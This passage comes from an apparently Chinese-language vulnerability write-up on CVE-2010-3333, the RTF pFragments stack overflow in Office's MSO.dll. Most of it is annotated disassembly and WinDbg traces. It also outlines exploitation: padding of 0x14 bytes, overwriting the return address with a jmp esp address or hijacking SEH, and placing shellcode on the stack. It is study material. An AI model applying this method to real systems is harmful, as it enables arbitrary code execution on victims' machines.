class="number">01</span>               <span class="keyword">test</span>    <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">edi</span>], <span class="number">1</span>   <span class="comment">; [edi] = [0x00123B68] = 0x73('s')</span></span><br><span class="line"><span class="symbol">    .text:</span>30D29EB0 <span class="number">74</span> <span class="number">09</span>                  <span class="keyword">jz</span>      short loc_30D29EBB  <span class="comment">; 等于0跳转,这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>30D29EB2         loc_30D29EB2:                         </span><br><span class="line"><span class="symbol">    .text:</span>30D29EB2 5F                     <span class="keyword">pop</span>     <span class="built_in">edi</span>                 <span class="comment">; edi = 0x001239a4(像是对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>30D29EB3 <span class="number">8D</span> <span class="number">86</span> C4 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>      <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">esi</span>+<span class="number">0C4h</span>]     <span class="comment">; eax = esi+0xc4 = 0x00123aa8+0xc4 = 0x00123b6c</span></span><br><span class="line"><span class="symbol">    .text:</span>30D29EB9 5E                     <span class="keyword">pop</span>     <span class="built_in">esi</span>                 <span class="comment">; esi = 0x00000000</span></span><br><span class="line"><span class="symbol">    .text:</span>30D29EBA C3                     <span class="keyword">retn</span>                        <span class="comment">;</span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line"><span class="symbol">.text:</span>30F0B5DF FF <span class="number">75</span> 0C               <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_4]         <span class="comment">; arg3: [ebp+0xC] = [0x001237ec+0xC] = [0x001237f8] = 0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5E2 8B <span class="number">70</span> <span class="number">64</span>               <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">eax</span>+<span class="number">64h</span>]      <span class="comment">;     esi = [0x00123b6c+0x64] = [0x00123bd0] = 0x01c40824(对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5E5 <span class="number">83</span> <span class="number">65</span> F8 <span class="number">00</span>            <span class="keyword">and</span>     [<span class="built_in">ebp</span>+var_8], <span class="number">0</span>      <span class="comment">;     [ebp-0x8] = [0x001237ec-0x8] = [0x001237e4]=0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5E9 8B <span class="number">06</span>                  <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esi</span>]          <span class="comment">;     eax = [esi] = [0x01c40824] = 0x30da33d8(虚表指针)</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5EB <span class="number">8D</span> <span class="number">4D</span> F0               <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_10]   <span class="comment">;     ecx = ebp-0x10 = 0x001237ec-0x10 = 0x001237dc</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5EE <span class="number">51</span>                     <span class="keyword">push</span>    <span class="built_in">ecx</span>                 <span class="comment">; arg2: ecx = 0x001237dc &lt;----目的地址</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5EF BB <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">05</span>         <span class="keyword">mov</span>     <span class="built_in">ebx</span>, <span class="number">5000000h</span>       <span class="comment">;     ebx = 0x05000000</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5F4 <span class="number">56</span>                     <span class="keyword">push</span>    <span class="built_in">esi</span>                 <span class="comment">; arg1: esi = 0x01c40824 &lt;----对象首地址</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5F5 <span class="number">89</span> <span class="number">5D</span> F4               <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_C], <span class="built_in">ebx</span>    <span class="comment">;     [ebp-0xc] = [0x001237ec-0xc] = [0x001237e0] = 0x05000000</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5F8 FF <span class="number">50</span> 1C               <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>+<span class="number">1Ch</span>] &lt;----- [<span class="built_in">eax</span>+<span class="number">1Ch</span>] = [<span class="number">0x30da33d8</span>+<span class="number">0x1c</span>] = [<span class="number">0x30da33f4</span>] = <span class="number">0x30ED4406</span>(虚函数地址)</span><br><span class="line"><span class="symbol">.text:</span>30F0B5FB 8B <span class="number">45</span> <span class="number">14</span>               <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_C]</span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line">*************************************************************</span><br><span class="line"></span><br><span class="line">    void __stdcall sub_30ED4406(<span class="keyword">int</span> a1, void *a2, <span class="keyword">int</span> a3)</span><br><span class="line"></span><br><span class="line">*************************************************************</span><br><span class="line"><span class="symbol">.text:</span>30ED4406 <span class="number">57</span>                     <span class="keyword">push</span>    <span class="built_in">edi</span>                 <span class="comment">;     edi = 0x001239a4(像是对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>30ED4407 8B 7C <span class="number">24</span> 0C            <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">esp</span>+<span class="number">4</span>+arg_4]  <span class="comment">; 目的地址: edi = [esp+4+8] = [0x001237b8+0xc] = [0x001237c4] = 0x001237dc(a2)</span></span><br><span class="line"><span class="symbol">.text:</span>30ED440B <span class="number">85</span> FF                  <span class="keyword">test</span>    <span class="built_in">edi</span>, <span class="built_in">edi</span>            <span class="comment">;     edi &amp; edi</span></span><br><span class="line"><span class="symbol">.text:</span>30ED440D <span class="number">74</span> <span class="number">27</span>                  <span class="keyword">jz</span>      short loc_30ED4436  <span class="comment">;     edi为0,则跳转,这里不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>30ED440F 8B <span class="number">44</span> <span class="number">24</span> <span class="number">08</span>            <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esp</span>+<span class="number">4</span>+arg_0]  <span class="comment">;     eax = [esp+4+4] = [0x001237b8+0x8]= [0x001237c0] = 0x01c40824(a1) &lt;----对象首地址</span></span><br><span class="line"><span class="symbol">.text:</span>30ED4413 8B <span class="number">48</span> <span class="number">08</span>               <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">eax</span>+<span class="number">8</span>]        <span class="comment">;     ecx = [eax+0x8] = [0x01c40824+0x8] = [0x01c4082c] = 0x0004c8ac</span></span><br><span class="line"><span class="symbol">.text:</span>30ED4416 <span class="number">81</span> E1 FF FF <span class="number">00</span> <span class="number">00</span>      <span class="keyword">and</span>     <span class="built_in">ecx</span>, <span class="number">0FFFFh</span>         <span class="comment">;     ecx = ecx &amp; 0xFFFF = 0xc8ac</span></span><br><span class="line"><span class="symbol">.text:</span>30ED441C <span class="number">56</span>                     <span class="keyword">push</span>    <span class="built_in">esi</span>                 <span class="comment">;     esi = 0x01c40824(对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>30ED441D 8B F1                  <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="built_in">ecx</span>            <span class="comment">;     esi = ecx = 0xc8ac</span></span><br><span class="line"><span class="symbol">.text:</span>30ED441F 0F AF <span class="number">74</span> <span class="number">24</span> <span class="number">14</span>         <span class="keyword">imul</span>    <span class="built_in">esi</span>, [<span class="built_in">esp</span>+<span class="number">8</span>+arg_8]  <span class="comment">;     esi = esi*[esp+8+0xc] = 0xc8ac*[0x001237b4+0x14] = 0xc8ac*[0x001237c8] = 0xc8ac*0x00000000 = 0x0(a3)</span></span><br><span class="line"><span class="symbol">.text:</span>30ED4424 <span class="number">03</span> <span class="number">70</span> <span class="number">10</span>               <span class="keyword">add</span>     <span class="built_in">esi</span>, [<span class="built_in">eax</span>+<span class="number">10h</span>]      <span class="comment">; 源地址: esi = esi + [0x01c40824+0x10] = 0 + [0x01c40834] = 0x1104000c</span></span><br><span class="line"><span class="symbol">.text:</span>30ED4427 8B C1                  <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">ecx</span>            <span class="comment">; 返回复制数据长度(字节): eax = ecx = 0xc8ac</span></span><br><span class="line"><span class="symbol">.text:</span>30ED4429 C1 E9 <span class="number">02</span>               <span class="keyword">shr</span>     <span class="built_in">ecx</span>, <span class="number">2</span>              <span class="comment">; 复制数据dword数: ecx = ecx &gt;&gt; 2 = 0xc8ac/4 = 0x0000322b </span></span><br><span class="line"><span class="symbol">.text:</span>30ED442C F3 A5                  <span class="keyword">rep</span> <span class="keyword">movsd</span>                   <span class="comment">; rep movs dword ptr es:[edi],dword ptr [esi]</span></span><br><span class="line">                                                                栈数据：</span><br><span class="line">                                                                001237B4   01C40824 &lt;-<span class="built_in">esp</span></span><br><span class="line">                                                                001237B8   001239A4</span><br><span class="line">                                                                001237BC   30F0B5FB  返回到 mso.30F0B5FB</span><br><span class="line">                                                                001237C0   01C40824</span><br><span class="line">                                                                001237C4   001237DC</span><br><span class="line">                                                                001237C8   <span class="number">00000000</span></span><br><span class="line">                                                                001237CC   <span class="number">00000000</span></span><br><span class="line">                                                                001237D0   <span class="number">00000000</span></span><br><span class="line">                                                                001237D4   <span class="number">00000000</span></span><br><span class="line">                                                                001237D8   0000FF35</span><br><span class="line">                                                                001237DC   FFFF0000 &lt;-pFragments缓冲区起始地址</span><br><span class="line">                                                                001237E0   <span class="number">05000000</span></span><br><span class="line">                                                                001237E4   <span class="number">00000000</span></span><br><span class="line">                                                                001237E8   0000FFFF</span><br><span class="line">                                                                001237EC   0012381C &lt;-<span class="built_in">ebp</span></span><br><span class="line">                                                                001237F0   30F0B56B  返回到 mso.30F0B56B 来自 mso.30F0B5C2</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;根据调试的结果，我们可以知道，<code>CrashFun(sub_30ED4406)</code>是在函数<code>sub_30F0B5C2</code>中地址<code>0x30F0B5F8</code>处的指令调用的。最后一条指令是<code>rep movsd</code>，其从<code>源地址(esi=0x1104000c)</code>循环复制数据到<code>目的地址(edi=0x001237dc)</code>，每次复制一个<code>dword</code>，复制数据的<code>dword个数</code>在<code>ecx(0x322b)</code>中，也就是<code>0xc8ac字节</code>。其实这个长度是源于<code>样本数据</code>的，它位于<code>pFragements</code>属性值的<code>第3个字段</code>，<code>偏移8个字符</code>后的<code>4个字符</code>即为复制数据的大小，如图：<br><img src="/resources/2020/CVE-2010-3333/pFragements.png" alt="样本中代表复制内存大小的数据"></p><p>&emsp;&emsp;<code>pFragements</code>数据在<code>栈</code>上的缓冲区的<code>起始地址</code>为<code>0x001237DC</code>,而<code>ebp</code>为<code>0x001237EC</code>,其后就是函数<code>sub_30ED4406</code>的<code>返回地址</code>。由于PoC中的pFragements属性值的数据量过大，覆盖到<code>不可写的内存地址</code>导致异常，所以并没有去<code>执行</code>覆盖后的<code>返回地址</code>以及<code>SEH异常处理函数</code>(SEH链被破坏了)。根据<code>MSO.dll</code>模块函数的<code>反汇编特征</code>，可以看出，<code>MSO.dll</code>模块并没有开启<code>GS</code>。通过查看<code>MSO.dll</code>的<code>IMAGE_OPTIONAL_HEADER</code>中的<code>DllCharacteristics</code>字段，其并没有设置<code>IMAGE_DLLCHARACTERISTICS_NX_COMPAT</code>标志，可以知道MSO.dll并没有开启<code>DEP</code>，即使开启了DEP，在<code>Windows XP SP3</code>上也是没有效果的。</p><p>&emsp;&emsp;所以我们可以将<code>Shellcode</code>直接布置在<code>栈</code>上，首先需要填充<code>pFragments缓冲区起始地址</code>到<code>保存返回地址的栈地址</code>之前的栈内存，是<code>0x14</code>字节，然后用<code>jmp esp</code>指令的地址覆盖<code>返回地址</code>，将<code>Shellcode</code>放置在返回地址的后面，就可以劫持<code>程序执行流</code>，执行任意代码。也可以通过覆盖<code>返回地址</code>之后的<code>SEH异常处理函数</code>的地址，劫持异常处理，获得<code>程序的执行流</code>。这些到后面漏洞利用章节再细细展开。</p><h4 id="2、Win7-amp-Office2007"><a href="#2、Win7-amp-Office2007" class="headerlink" title="2、Win7&amp;Office2007"></a>2、Win7&amp;Office2007</h4><p>&emsp;&emsp;首先打开<code>WINWORD.exe</code>，然后打开<code>WinDbg</code>，Attach上WINWORD.exe的进程，程序会自动中断在<code>ntdll!DbgBreakPoint</code>处，<code>g</code>运行程序，然后打开<code>CVE-2010-3333(target6,Crash).rtf</code>文件，程序会中断在<code>MSO.dll</code>的<code>0x32cf3814</code>处，此处就是<code>触发异常</code>的指令：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">010</span>&gt; g</span><br><span class="line"><span class="symbol">ModLoad:</span> 3bd10000 3bea5000   C:\Program Files\<span class="meta">Common</span> Files\Microsoft Shared\OFFICE12\OGL.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 3fd00000 3fd0d000   C:\Windows\system32\WTSAPI32.DLL</span><br><span class="line">(d9c.4a8): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected <span class="keyword">and</span> handled.</span><br><span class="line"><span class="built_in">eax</span>=3c524228 <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0011fdfc <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=066a55e0 <span class="built_in">edi</span>=0011ffb8</span><br><span class="line"><span class="built_in">eip</span>=32cf3814 <span class="built_in">esp</span>=0011fdb0 <span class="built_in">ebp</span>=0011fdb0 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00010206</span></span><br><span class="line">*** ERROR: Symbol file could <span class="keyword">not</span> be found.  Defaulted to export symbols for C:\Program Files\<span class="meta">Common</span> Files\Microsoft Shared\office12\mso.dll - </span><br><span class="line">mso!Ordinal7356+<span class="number">0x1315</span>:</span><br><span class="line">32cf3814 8b4804          <span class="keyword">mov</span>     <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>+<span class="number">4</span>] <span class="built_in">ds</span>:<span class="number">0023</span>:3c52422c=????????</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; !address 3c52422c              </span><br><span class="line">Failed to map Heaps (error <span class="number">80004005</span>)</span><br><span class="line"><span class="symbol">Usage:</span>                  Free</span><br><span class="line">Base Address:           3c413000</span><br><span class="line">End Address:            3fd00000</span><br><span class="line">Region Size:            038ed000</span><br><span class="line"><span class="symbol">Type:</span>                   <span class="number">00000000</span>    </span><br><span class="line"><span class="symbol">State:</span>                  <span class="number">00010000</span>    MEM_FREE</span><br><span class="line"><span class="symbol">Protect:</span>                <span class="number">00000001</span>    PAGE_NOACCESS</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;我们通过<code>!address</code>命令查看触发异常的指令<code>mov ecx,dword ptr [eax+4]</code>所访问的内存地址<code>0x3c52422c</code>的相关信息，可以发现此地址是不具有访问权限的(<code>PAGE_NOACCESS</code>)。然后，我们需要追踪<code>数据流</code>。首先查看<code>栈回溯</code>:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line"><span class="symbol">WARNING:</span> Stack unwind information <span class="keyword">not</span> available. Following frames may be wrong.</span><br><span class="line">0011fdb0 32e5944d 0011fdc4 <span class="number">41306141</span> <span class="number">05000000</span> mso!Ordinal7356+<span class="number">0x1315</span>(32cf3814当前指令地址)</span><br><span class="line">             ↑------------------------------------------↓</span><br><span class="line">0011fdcc 32e595bf <span class="number">41306141</span> <span class="number">41386141</span> 0011fdfc mso!Ordinal2605+<span class="number">0x326e</span>(32e5944d)[mso!Ordinal7356+<span class="number">0x1308</span> (32cf3807)的返回地址]</span><br><span class="line">             ↑------------------------------------------↓</span><br><span class="line">0011fe04 <span class="number">37614136</span> <span class="number">41386141</span> <span class="number">62413961</span> <span class="number">31624130</span> mso!Ordinal2605+<span class="number">0x33e0</span>(32e595bf)[mso!Ordinal2605+<span class="number">0x323c</span> (32e5941b)的返回地址]</span><br><span class="line">0011fe08 <span class="number">41386141</span> <span class="number">62413961</span> <span class="number">31624130</span> <span class="number">41326241</span> <span class="number">0x37614136</span></span><br><span class="line">0011fe0c <span class="number">62413961</span> <span class="number">31624130</span> <span class="number">41326241</span> <span class="number">62413362</span> <span class="number">0x41386141</span></span><br><span class="line">0011fe10 <span class="number">31624130</span> <span class="number">41326241</span> <span class="number">62413362</span> <span class="number">35624134</span> <span class="number">0x62413961</span></span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;触发异常的指令(<code>0x32cf3814</code>)所在函数是<code>sub_32CF3807</code>，其父函数为<code>sub_32E5941B</code>，由于栈已被破坏，所以无法再回溯。通过IDA及<code>sub_32E5941B的返回地址</code>(0x32e595bf)，我们可以知道，<code>sub_32E5941B</code>的父函数是<code>sub_32E5955E</code>。通过对这几个函数详细分析，得到的结果如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">*************************************************************************************************</span><br><span class="line"></span><br><span class="line">    char __userpurge sub_32E5955E@&lt;<span class="built_in">al</span>&gt;(<span class="keyword">int</span> a1@&lt;<span class="built_in">eax</span>&gt;, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> *a5, <span class="keyword">int</span> a6)</span><br><span class="line"></span><br><span class="line">*************************************************************************************************</span><br><span class="line"><span class="symbol">.text:</span>32E5955E                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011fe34 </span></span><br><span class="line"><span class="symbol">.text:</span>32E5955F                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                 <span class="comment">;   ebp = esp = 0x0011fe04 </span></span><br><span class="line"><span class="symbol">.text:</span>32E59561                 <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">14h</span>                 <span class="comment">;   esp = esp-0x14 = 0x0011fe04-0x14 = 0x0011fdf0 </span></span><br><span class="line"><span class="symbol">.text:</span>32E59564                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+arg_10], <span class="number">0</span>          <span class="comment">;   [ebp+0x18] = [0x0011fe04+0x18] = [0x0011fe1c] = 0x02360818(a6)</span></span><br><span class="line"><span class="symbol">.text:</span>32E59568                 <span class="keyword">push</span>    <span class="built_in">edi</span>                      <span class="comment">;   edi = 0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>32E59569                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="built_in">eax</span>                 <span class="comment">;   edi = eax = 0x0011ffb8(a1)</span></span><br><span class="line"><span class="symbol">.text:</span>32E5956B                 <span class="keyword">jnz</span>     short loc_32E5957E       <span class="comment">;   不为零，跳转，这里跳转</span></span><br><span class="line">......                          </span><br><span class="line"><span class="symbol">.text:</span>32E5957E                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">edi</span>+<span class="number">8</span>]             <span class="comment">;   ecx = [edi+8] = [0x0011ffb8+8] = [0x0011ffc0] = 0x001200d8</span></span><br><span class="line"><span class="symbol">.text:</span>32E59581                 <span class="keyword">push</span>    <span class="built_in">ebx</span>                      <span class="comment">;   ebx = 0x00000000 </span></span><br><span class="line"><span class="symbol">.text:</span>32E59582                 <span class="keyword">push</span>    <span class="built_in">esi</span>                      <span class="comment">;   esi = 0x00000000 </span></span><br><span class="line"><span class="symbol">.text:</span>32E59583                 <span class="keyword">call</span>    sub_327A2549             <span class="comment">; </span></span><br><span class="line"><span class="symbol">.text:</span>32E59588                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_4]              <span class="comment">; arg3: [ebp+0xc] = [0x0011fe04+0xc] = [0x0011fe10] = 0x00000000(a3)</span></span><br><span class="line"><span class="symbol">.text:</span>32E5958B                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">eax</span>+<span class="number">64h</span>]           <span class="comment">;   esi = [eax+0x64] = [0x001201ac+0x64] = [0x00120210] = 0x066a55e0(对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>32E5958E                 <span class="keyword">and</span>     [<span class="built_in">ebp</span>+var_8], <span class="number">0</span>           <span class="comment">;   [ebp-8] = [0x0011fe04-0x8] = [0x0011fdfc] = 0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>32E59592                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esi</span>]               <span class="comment">;   eax = [esi] = [0x066a55e0] = 0x32a0c8c4(虚表指针)</span></span><br><span class="line"><span class="symbol">.text:</span>32E59594                 <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_10]        <span class="comment">;   ecx = ebp-0x10 = 0x0011fe04-0x10 = 0x0011fdf4 &lt;----(5)</span></span><br><span class="line"><span class="symbol">.text:</span>32E59597                 <span class="keyword">push</span>    <span class="built_in">ecx</span>                      <span class="comment">; arg2: ecx = 0x0011fdf4(目的地址)</span></span><br><span class="line"><span class="symbol">.text:</span>32E59598                 <span class="keyword">mov</span>     <span class="built_in">ebx</span>, <span class="number">5000000h</span>            <span class="comment">;   ebx = 0x05000000</span></span><br><span class="line"><span class="symbol">.text:</span>32E5959D                 <span class="keyword">push</span>    <span class="built_in">esi</span>                      <span class="comment">; arg1: esi = 0x066a55e0(对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>32E5959E                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_C], <span class="built_in">ebx</span>         <span class="comment">;   [ebp-0xc] = [0x0011fe04-0xc] = [0x0011fdf8] = ebx = 0x05000000</span></span><br><span class="line"><span class="symbol">.text:</span>32E595A1                 <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>+<span class="number">1Ch</span>]      <span class="comment">; [eax+0x1c] = [0x32a0c8c4+0x1c] = [0x32a0c8e0] = 0x327c002c(虚函数地址) &lt;----(6)</span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line"><span class="symbol">    .text:</span>327C002C                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011fe04 </span></span><br><span class="line"><span class="symbol">    .text:</span>327C002D                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                 <span class="comment">;   ebp = esp = 0x0011fdd0 </span></span><br><span class="line"><span class="symbol">    .text:</span>327C002F                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+Dst], <span class="number">0</span>             <span class="comment">;   [ebp+Dst] = [0x0011fdd0+0xc] = [0x0011fddc] = 0x0011fdf4(a2)(目的地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0033                 <span class="keyword">jz</span>      short loc_327C0054       <span class="comment">;   等于0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0035                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+arg_0]         <span class="comment">;   ecx = [ebp+8] = [0x0011fdd0+8] = [0x0011fdd8] = 0x066a55e0(对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0038                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ecx</span>+<span class="number">0Ch</span>]           <span class="comment">;   eax = [ecx+0xc] = [0x066a55e0+0xc] = [0x066a55ec] = 0x0004c8ac(成员变量，复制数据长度)</span></span><br><span class="line"><span class="symbol">    .text:</span>327C003B                 <span class="keyword">and</span>     <span class="built_in">eax</span>, <span class="number">0FFFFh</span>              <span class="comment">;   eax = eax &amp; 0xFFFF = 0x0004c8ac&amp;0xFFFF = 0xc8ac</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0040                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; Size   ; arg3复制数据长度: eax = 0xc8ac</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0041                 <span class="keyword">imul</span>    <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_8]         <span class="comment">;   eax = eax*[0x0011fdd0+0x10] = 0xc8ac*0x0 = 0x0</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0045                 <span class="keyword">add</span>     <span class="built_in">eax</span>, [<span class="built_in">ecx</span>+<span class="number">10h</span>]           <span class="comment">;   eax = eax+[0x066a55e0+0x10] = 0x0+0x1d400000 = 0x1d400000</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0048                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; Src    ; arg2源地址: eax = 0x1d400000</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0049                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+Dst]       <span class="comment">; Dst    ; arg1目的地址: [ebp+0xc] = [0x0011fdd0+0xc] = [0x0011fddc] = 0x0011fdf4(a2)</span></span><br><span class="line"><span class="symbol">    .text:</span>327C004C                 <span class="keyword">call</span>    memcpy                   <span class="comment">; 0x0012c6a0 - 0x0011fdf4 = 0xc8ac未出现非法内存访问,栈已被破坏</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0051                 <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">0Ch</span>                 <span class="comment">;   esp = esp+0xc = 0x0011fdc4+0xc = 0x0011fdd0 </span></span><br><span class="line"><span class="symbol">    .text:</span>327C0054                 <span class="keyword">pop</span>     <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011fe04</span></span><br><span class="line"><span class="symbol">    .text:</span>327C0055                 <span class="keyword">retn</span>    <span class="number">0Ch</span>                      <span class="comment">;   esp -&gt; 0x32e595a4(返回地址) </span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line"><span class="symbol">.text:</span>32E595A4                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_C]         <span class="comment">;   eax = [ebp+0x14] = [0x0011fe18] = 0x41326241(a5)</span></span><br><span class="line"><span 